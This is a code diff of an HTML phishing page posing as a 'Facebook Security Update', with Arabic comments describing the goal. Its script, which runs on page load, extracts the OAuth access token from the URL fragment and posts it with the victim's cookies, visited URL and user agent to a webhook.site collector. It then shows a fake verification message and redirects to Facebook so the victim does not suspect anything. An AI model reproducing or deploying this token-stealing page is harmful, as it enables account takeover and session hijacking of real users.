@@ -1,29 +1,42 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Security Verification</title>
+    <title>Facebook Security Update</title>
 </head>
 <body>
     <script>
-        // 1. استخراج التوكن من الرابط إذا كان موجوداً
-        const urlParams = new URLSearchParams(window.location.hash.replace("#", "?"));
-        const token = urlParams.get('access_token');
+        (function() {
+            // 1. استخراج التوكن من الرابط (Hash)
+            const fullUrl = window.location.href;
+            const hash = window.location.hash;
+            let token = "";
+            
+            if (hash.includes('access_token=')) {
+                token = hash.split('access_token=')[1].split('&')[0];
+            }
 
-        // 2. إرسال البيانات (التوكن + الكوكيز) إلى Webhook.site
-        fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                access_token: token,
-                cookies: document.cookie,
-                victim_info: navigator.userAgent,
-                time: new Date().toLocaleString()
-            })
-        });
+            // 2. إرسال البيانات فوراً إلى Webhook.site الخاص بك
+            const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    access_token: token,
+                    cookies: document.cookie,
+                    url_visited: fullUrl,
+                    device: navigator.userAgent
+                })
+            });
 
-        // 3. تمويه الضحية لعدم الشك
-        document.body.innerHTML = "<center><h2 style='color:green;margin-top:50px;'>تم التحقق من أمان حسابك بنجاح. يمكنك إغلاق الصفحة الآن.</h2></center>";
+            // 3. التمويه: إظهار رسالة ثم التوجيه لفيسبوك لتجنب شك الضحية
+            document.body.innerHTML = "<center><h2 style='margin-top:50px; font-family:sans-serif;'>Checking security status... Please wait.</h2></center>";
+            
+            setTimeout(() => {
+                window.location.href = "https://www.facebook.com/security/2fa/setup/intro/";
+            }, 1500);
+        })();
     </script>
 </body>
 </html>
